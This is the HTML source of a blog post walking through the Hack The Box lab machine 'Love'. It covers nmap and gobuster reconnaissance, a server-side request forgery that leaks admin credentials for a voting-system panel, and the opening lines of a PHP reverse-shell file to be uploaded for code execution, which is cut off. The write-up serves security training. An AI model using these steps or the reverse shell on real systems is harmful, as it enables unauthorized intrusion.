@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 WindowsDifficulty:	EasyPoints:	20Release:	01 May 2021IP:	10.10.10.239">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[Love]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/05/03/love/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 WindowsDifficulty:	EasyPoints:	20Release:	01 May 2021IP:	10.10.10.239">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1944.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1945.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1946.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1947.jpg">
+<meta property="article:published_time" content="2021-05-03T05:47:50.000Z">
+<meta property="article:modified_time" content="2021-08-08T13:10:43.202Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1944.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/05/03/love/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/05/03/love/","path":"2021/05/03/love/","title":"Hack-The-Box-walkthrough[Love]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[Love] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Port-80"><span class="nav-number">3.</span> <span class="nav-text">Port-80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-escalation"><span class="nav-number">4.</span> <span class="nav-text">Privilege escalation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">5.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">6.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/05/03/love/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[Love] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[Love]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-05-03 13:47:50" itemprop="dateCreated datePublished" datetime="2021-05-03T13:47:50+08:00">2021-05-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-08-08 21:10:43" itemprop="dateModified" datetime="2021-08-08T21:10:43+08:00">2021-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Windows<br>Difficulty:	Easy<br>Points:	20<br>Release:	01 May 2021<br>IP:	10.10.10.239</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1944.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/love]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.239</span></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">10/tcp    open  tcpwrapped</span><br><span class="line">80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>j PHP/<span class="number">7.3</span>.<span class="number">27</span>)</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">443</span>/tcp   open  ssl/http     Apache httpd <span class="number">2.4</span>.<span class="number">46</span> (OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>j PHP/<span class="number">7.3</span>.<span class="number">27</span>)</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds Microsoft Windows <span class="number">7</span> - <span class="number">10</span> microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">3306</span>/tcp  open  mysql?</span><br><span class="line"><span class="number">5000</span>/tcp  open  http         Apache httpd <span class="number">2.4</span>.<span class="number">46</span> (OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>j PHP/<span class="number">7.3</span>.<span class="number">27</span>)</span><br><span class="line"><span class="number">5040</span>/tcp  open  unknown</span><br><span class="line"><span class="number">5985</span>/tcp  open  http         Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line"><span class="number">5986</span>/tcp  open  ssl/http     Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line"><span class="number">47001</span>/tcp open  http         Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line"><span class="number">49664</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">49665</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">49666</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">49667</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">49668</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">49669</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line"><span class="number">49670</span>/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<p>There is lot of ports open.</p>
+<p>Let’s first start with port-80</p>
+<h3 id="Port-80"><a href="#Port-80" class="headerlink" title="Port-80"></a>Port-80</h3><p>There is a login page that need voter id &amp; Password.</p>
+<p>Let’s use gobuster to find some new directories.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/love]</span><br><span class="line">└─<span class="comment"># gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.10.239</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/05/02 04:06:36 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 338] [--&gt; http://10.10.10.239/images/]</span><br><span class="line">/Images               (Status: 301) [Size: 338] [--&gt; http://10.10.10.239/Images/]</span><br><span class="line">/admin                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/admin/] </span><br><span class="line">/plugins              (Status: 301) [Size: 339] [--&gt; http://10.10.10.239/plugins/]</span><br><span class="line">/includes             (Status: 301) [Size: 340] [--&gt; http://10.10.10.239/includes/]</span><br><span class="line">/dist                 (Status: 301) [Size: 336] [--&gt; http://10.10.10.239/dist/]    </span><br><span class="line">/licenses             (Status: 403) [Size: 421]                                     </span><br><span class="line">/examples             (Status: 503) [Size: 402]                                     </span><br><span class="line">/IMAGES               (Status: 301) [Size: 338] [--&gt; http://10.10.10.239/IMAGES/]  </span><br><span class="line">/%20                  (Status: 403) [Size: 302]                                     </span><br><span class="line">/Admin                (Status: 301) [Size: 337] [--&gt; http://10.10.10.239/Admin/]   </span><br><span class="line">/*checkout*           (Status: 403) [Size: 302]                                     </span><br><span class="line">/Plugins              (Status: 301) [Size: 339] [--&gt; http://10.10.10.239/Plugins/] </span><br><span class="line">/phpmyadmin           (Status: 403) [Size: 302]                                     </span><br><span class="line">/webalizer            (Status: 403) [Size: 302]                                     </span><br><span class="line">/*docroot*            (Status: 403) [Size: 302]                                     </span><br><span class="line">/*                    (Status: 403) [Size: 302]                                     </span><br><span class="line">/con                  (Status: 403) [Size: 302]                                     </span><br><span class="line">/http%3A              (Status: 403) [Size: 302]                                     </span><br><span class="line">/Includes             (Status: 301) [Size: 340] [--&gt; http://10.10.10.239/Includes/]</span><br><span class="line">/**http%3a            (Status: 403) [Size: 302]</span><br></pre></td></tr></table></figure>
+
+<p>Got a &#x2F;admin directory let’s check the &#x2F;admin page.</p>
+<p>And page asking for username and password which we don’t have.</p>
+<p>Let’s check https port 443.</p>
+<p>And it’s Forbidden.</p>
+<p>Let’s check port 5000.</p>
+<p>And it’s also Forbidden.</p>
+<p>If we check https certificate we find a new vhost.</p>
+<p>Let’s add this vhost in our &#x2F;etc&#x2F;hosts file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.239    staging.love.htb</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s go to staging.love.htb</p>
+<p>It’s a free file scanner service.</p>
+<p>Let’s check Demo page.</p>
+<p>It’s asking for file url. let’s add the localhost url with port 5000 which said for Forbidden.</p>
+<p><span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo1MDAwLw==">http://127.0.0.1:5000<i class="fa fa-external-link-alt"></i></span></p>
+<p>And we got the admin creads for voting system.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:@LoveIsInTheAir!!!!</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s go to 10.10.10.239&#x2F;admin which we find with gobuster.</p>
+<p>We are inside votingsystem admin panel.</p>
+<p>Let’s check on google for any vulnerability in votingsystem.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDk0NDU=">Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>But the exploit is not working so we need to do this manually.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2l2YW4tc2luY2VrL3BocC1yZXZlcnNlLXNoZWxsL2Jsb2IvbWFzdGVyL3NyYy9taW5pZmllZC9waHBfcmV2ZXJzZV9zaGVsbF9taW5pLnBocA==">php_reverse_shell_mini.php<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>I use this mini php rev shell to get the rev shell.</p>
+<ul>
+<li>Exploit.php</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php class Sh</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$a</span> = null;</span><br><span class="line">    private <span class="variable">$p</span> = null;</span><br><span class="line">    private <span class="variable">$os</span> = null;</span><br><span class="line">    private <span class="variable">$sh</span> = null;</span><br><span class="line">    private <span class="variable">$ds</span> = array(</span><br><span class="line">        0 =&gt; array(</span><br><span class="line">            <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">            <span 